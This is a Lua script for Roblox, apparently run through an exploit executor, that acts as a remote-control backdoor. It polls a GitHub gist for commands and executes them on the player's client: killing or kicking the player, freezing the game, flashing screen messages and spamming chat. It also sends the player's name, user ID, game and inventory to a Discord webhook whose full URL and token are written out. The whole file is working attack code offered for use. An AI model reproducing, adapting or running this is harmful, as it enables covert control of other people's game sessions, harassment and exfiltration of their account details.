local request = (syn and syn.request) or (http and http.request) or http_request or request
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer
local GIST_URL = "https://gist.githubusercontent.com/arxitectorcz/fa2e7f22f682569b974a71810463d388/raw/"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0"

local lastCommand = "" 
local loops = {spam = false, lag = nil}

local function getInventory()
	local items = {}
	for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do table.insert(items, v.Name) end
	if LocalPlayer.Character then
		for _, v in pairs(LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then table.insert(items, v.Name .. " (E)") end
		end
	end
	return #items > 0 and table.concat(items, ", ") or "Empty"
end

local function sendWebhook(title, desc, color, extraField)
	local pInfo = MarketplaceService:GetProductInfo(game.PlaceId)
	local fields = {
		{["name"] = "👤 Player", ["value"] = string.format("[%s](https://www.roblox.com/users/%d/profile)", LocalPlayer.Name, LocalPlayer.UserId), ["inline"] = true},
		{["name"] = "🎮 Game", ["value"] = string.format("[%s](https://www.roblox.com/games/%d/)", pInfo.Name, game.PlaceId), ["inline"] = true},
		{["name"] = "🎒 Inventory", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
	}
	if extraField then table.insert(fields, extraField) end

	local data = {
		["embeds"] = {{
			["title"] = title,
			["description"] = desc,
			["color"] = color,
			["fields"] = fields,
			["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
			["footer"] = {["text"] = "Gist-Control • " .. os.date("%X")}
		}}
	}
	pcall(function()
		request({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)
end

local function showScreenMessage(txt)
	local sg = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
	local l = Instance.new("TextLabel", sg)
	l.Size, l.Position = UDim2.new(1, 0, 1, 0), UDim2.new(0,0,0,0)
	l.BackgroundTransparency, l.TextColor3, l.TextScaled, l.Font = 1, Color3.new(1, 0, 0), true, Enum.Font.FredokaOne
	l.Text = txt
	task.delay(5, function() sg:Destroy() end)
end

local function execute(text)
	local args = string.split(text, " ")
	local cmd = args[1]:lower()
	local val = table.concat(args, " ", 2)
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChild("Humanoid")

	if cmd == "kill" and hum then 
		hum.Health = 0
	elseif cmd == "kick" then 
		LocalPlayer:Kick(val)
	elseif cmd == "rejoin" then 
		TeleportService:Teleport(game.PlaceId)
	elseif cmd == "speed" and hum then 
		hum.WalkSpeed = tonumber(val) or 16
	elseif cmd == "jump" and hum then 
		hum.JumpPower = tonumber(val) or 50
	elseif cmd == "message" then 
		showScreenMessage(val)
	elseif cmd == "fire" and char then 
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if hrp then local f = Instance.new("Fire", hrp) f.Name = "GistFire" f.Size = 15 end
	elseif cmd == "unfire" and char then 
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if hrp and hrp:FindFirstChild("GistFire") then hrp.GistFire:Destroy() end
	elseif cmd == "darktime" then 
		Lighting.Brightness = 0 Lighting.ClockTime = 0
		task.delay(5, function() Lighting.Brightness = 2 Lighting.ClockTime = 14 end)
	elseif cmd == "lag" then 
		loops.lag = RunService.Heartbeat:Connect(function()
			local t = tick() while tick() - t < 0.15 do end
		end)
	elseif cmd == "unlag" then 
		if loops.lag then loops.lag:Disconnect() loops.lag = nil end
	elseif cmd == "chat_spam" then
		loops.spam = true
		sendWebhook("💬 Spam Started", "Spamming in progress...", 0xFFFF00, {["name"] = "📝 Message", ["value"] = "```" .. val .. "```"})
		task.spawn(function()
			while loops.spam do
				local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
				if chatEvent then chatEvent.SayMessageRequest:FireServer(val, "All") end
				task.wait(0.5)
			end
		end)
	elseif cmd == "stop_spam" then 
		loops.spam = false
	end

	if cmd ~= "chat_spam" then
		sendWebhook("⚡ Command Executed", "**Result:** `" .. text .. "`", 0xFF0044)
	end
end

task.spawn(function()
	sendWebhook("🚀 System Online", "Connected and monitoring Gist.", 0x00BFFF)
	
	local start = request({Url = GIST_URL .. "?t=" .. tick(), Method = "GET"})
	if start.Success then lastCommand = start.Body:gsub("^%s*(.-)%s*$", "%1") end

	while true do
		local success, res = pcall(function()
			return request({Url = GIST_URL .. "?t=" .. tick(), Method = "GET"})
		end)

		if success and res.Body then
			local cmd = res.Body:gsub("^%s*(.-)%s*$", "%1")
			if cmd ~= lastCommand and cmd ~= "" then
				lastCommand = cmd
				execute(cmd)
			end
		end
		task.wait(2)
	end
end)
